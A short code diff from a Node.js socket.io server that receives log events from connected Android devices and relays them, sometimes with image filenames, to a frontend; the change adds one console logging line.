@@ -252,6 +252,7 @@ androidIo.on("connection", async (socket) => {
 
                 // Determine what to store in logs and emit to frontend
                 if (embeddedImageFilename) {
+                    console.log(chalk.green(`[+] Sending logger event with image to frontend: ${embeddedImageFilename}`));
                     device.logs.push({ timestamp: Date.now(), log: logText, image: embeddedImageFilename });
                     frontendIo.emit("logger", { 
                         device: deviceUuid, 
